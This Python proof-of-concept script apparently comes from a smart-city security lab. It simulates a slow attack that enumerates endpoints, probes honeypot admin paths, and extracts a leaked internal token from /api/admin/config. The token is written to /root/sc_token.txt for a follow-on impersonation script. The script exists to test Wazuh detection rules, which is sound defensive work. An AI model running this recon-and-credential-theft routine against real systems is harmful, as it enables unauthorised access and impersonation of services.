#!/usr/bin/env python3
"""
Threat 2 PoC: APT / C2 simulation — low-and-slow honeypot probing + credential extraction.

Attack chain:
  0. Recon: probe 6 unknown paths (all 404) — Wazuh rule 100203 fires (endpoint enumeration)
  1. APT:   probe /api/admin/config and /api/admin/metrics (Wazuh rule 100200 per hit)
  2. /api/admin/config leaks the internal_token (misconfigured debug endpoint)
  3. Extracted token is saved to TOKEN_FILE for use by spam_attack.py
  4. After 3+ honeypot hits Wazuh rule 100201 fires (APT confirmed) → IP blocked

Run from the Debian VM — the script auto-detects the smartcity-services Incus IP.
Port 5100 must be exposed (added in docker-compose.yml).

Usage:
    python3 poc/apt_attack.py [--target http://<ip>:5100] [--probes 5] [--delay 10]
"""
import argparse
import json
import subprocess
import time
import urllib.request
import urllib.error
from datetime import datetime

RECON_PATHS = [
    "/admin",
    "/api/v1/data",
    "/debug",
    "/api/v1/users",
    "/api/v1/config",
    "/api/keys",
]

TOKEN_FILE = "/root/sc_token.txt"


def _incus_ip(container="smartcity-services"):
    """Return the eth0 IPv4 of an Incus container, or None if not found."""
    try:
        out = subprocess.check_output(
            ["incus", "list", container, "-f", "csv", "-c", "4"],
            stderr=subprocess.DEVNULL, text=True,
        ).strip()
        for line in out.splitlines():
            if "eth0" in line:
                return line.split()[0]
        return None
    except Exception:
        return None


_ip = _incus_ip()
_default_target = f"http://{_ip}:5100" if _ip else "http://localhost:5100"

parser = argparse.ArgumentParser(description="APT PoC — honeypot probing + credential extraction")
parser.add_argument("--target", default=_default_target, help="Zone aggregator-north URL")
parser.add_argument("--probes", type=int, default=5, help="Number of probe rounds")
parser.add_argument("--delay", type=float, default=10.0, help="Delay between rounds (seconds)")
args = parser.parse_args()

HONEYPOT_PATHS = ["/api/admin/config", "/api/admin/metrics"]

print(f"[*] APT PoC — target: {args.target}")
print(f"[*] Phase 0: Recon — {len(RECON_PATHS)} paths  →  Wazuh rule 100203 (enumeration)")
print(f"[*] Phase 1: APT   — {args.probes} rounds × {len(HONEYPOT_PATHS)} endpoints, {args.delay}s between rounds  →  Wazuh rule 100201")
print()

# --- Phase 0: Recon — blind endpoint enumeration ---
print(f"[*] --- Phase 0: Recon ---")
for path in RECON_PATHS:
    url = args.target + path
    try:
        with urllib.request.urlopen(url, timeout=5) as resp:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] RECON  GET {path} -> {resp.status} (discovered!)")
    except urllib.error.HTTPError as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] RECON  GET {path} -> {e.code}")
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] RECON  GET {path} -> ERROR {e}")
    time.sleep(0.5)

print(f"[!] Recon complete — Wazuh rule 100203 (endpoint enumeration) should have fired")
print(f"[*] Transitioning to APT phase: probing admin endpoints...")
print()

# --- Phase 1: APT — low-and-slow honeypot probing ---
print(f"[*] --- Phase 1: APT ---")
extracted_token = None

for i in range(1, args.probes + 1):
    for path in HONEYPOT_PATHS:
        url = args.target + path
        try:
            with urllib.request.urlopen(url, timeout=5) as resp:
                raw = resp.read(1024).decode()
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Round {i}  GET {path} -> 200")

            # /api/admin/config leaks the internal_token — extract it on first hit
            if path == "/api/admin/config" and extracted_token is None:
                try:
                    data = json.loads(raw)
                    token = data.get("config", {}).get("internal_token")
                    if token:
                        extracted_token = token
                        with open(TOKEN_FILE, "w") as f:
                            f.write(token)
                        print(f"[!] CREDENTIAL LEAK — internal_token extracted from /api/admin/config")
                        print(f"[!] Token: {token}")
                        print(f"[!] Saved to {TOKEN_FILE}")
                        print(f"[!] Can now impersonate internal services — run spam_attack.py next")
                except Exception:
                    pass

        except urllib.error.HTTPError as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Round {i}  GET {path} -> HTTP {e.code}")
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Round {i}  GET {path} -> ERROR {e}")

    if i < args.probes:
        print(f"    ... sleeping {args.delay}s (simulating low-and-slow C2 keep-alive) ...")
        time.sleep(args.delay)

total = args.probes * len(HONEYPOT_PATHS)
print()
print(f"[+] Done. {args.probes} rounds × {len(HONEYPOT_PATHS)} endpoints = {total} requests")
print(f"[+] Wazuh:      rule 100200 (HONEYPOT_HIT), 100201 (APT confirmed — 3+ hits same IP)")
print(f"[+] Prometheus: wazuh_alerts_total{{rule_id='100200'}}")
if extracted_token:
    print(f"[+] Next step:  python3 poc/spam_attack.py  (token already saved to {TOKEN_FILE})")
else:
    print(f"[!] Token not extracted — check that zone-aggregator-north is reachable")
